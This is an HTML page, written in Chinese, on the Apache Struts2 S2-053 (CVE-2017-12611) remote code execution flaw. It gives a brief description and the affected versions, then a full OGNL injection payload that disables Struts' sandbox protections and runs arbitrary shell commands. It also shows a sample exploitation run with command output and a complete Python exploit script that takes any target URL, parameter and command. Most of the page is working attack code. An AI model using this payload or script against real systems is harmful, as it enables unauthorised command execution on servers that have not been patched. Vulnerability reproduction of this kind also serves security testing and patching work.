<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2017-12611s2-053"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2017-12611</span><span class="csECDA2D3">）</span><span class="csDE05BCC">S2-053</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在一定条件下，当开发人员在</span><span class="cs8926E06">Freemarker</span><span class="cs9C1B1871">标签中使用错误的构造时，可能会导致远程代码执行漏洞</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.0.1 - 2.3.33<br/>Struts 2.5 - 2.5.10</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;whoami&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注意：执行命令的地方在于</span><span class="cs8926E06">(#cmd=&rsquo;whoami&rsquo;)</span></p><h3 class="cs868C439D">
			<a name="python-poc"><span class="csD1E291E2">python poc</span></a></h3>
		<h4 class="cs868C439D">
			<a name="usage"><span class="csBF12A472">Usage</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">exploit.py &lt;url&gt; &lt;param&gt; &lt;command&gt;</span></p><h4 class="cs868C439D">
			<a name="example"><span class="csBF12A472">Example</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">$ python s2-053-exploit.py &quot;http://127.0.0.1&quot; &quot;name&quot; &quot;uname -a&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Generated EXP: http://127.0.0.1/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27uname%20-a%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[*] Exploiting...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Response: &lt;html&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;head&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;title&gt;S2-053 Demo&lt;/title&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/head&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;h1&gt;S2-053 Demo&lt;/h1&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;hr /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Your name: Linux a66c177c2326 4.4.0-70-generic ;jsessionid=64A259D92EC63543AD72E6AA847319C9#91-Ubuntu SMP Wed Mar 22 12:47:43 UTC 2017 x86_64 GNU/Linux</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&lt;hr /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Enter your name here:&lt;br /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/form&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;p&gt;See more at: &lt;a href=&quot;https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053&quot;&gt;VulApps - S2-053&lt;/a&gt;&lt;/p&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/html&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] Exploit Finished!</span></p><h4 class="cs868C439D">
			<a name="exploitpy"><span class="csBF12A472">exploit.py</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib import quote</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def exploit(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = requests.get(url, timeout=10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res.status_code == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Response: {}&quot;.format(str(res.text))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\n[+] Exploit Finished!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\n[!] Exploit Failed!&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) != 4:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;&quot;&quot;****S2-053 Exploit****</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit.py &lt;url&gt; &lt;param&gt; &lt;command&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Example:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit.py &quot;http://127.0.0.1/&quot; &quot;name&quot; &quot;uname -a&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;param = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;command = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#payload = &quot;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&quot;+command+&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Can show the echo message</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &quot;%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;&quot;+command+&quot;&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;link = &quot;{}/?{}={}&quot;.format(url, param, quote(payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;[*] Generated EXP: {}&quot;.format(link)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &quot;\n[*] Exploiting...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit(link)</span></p></body>
</html>
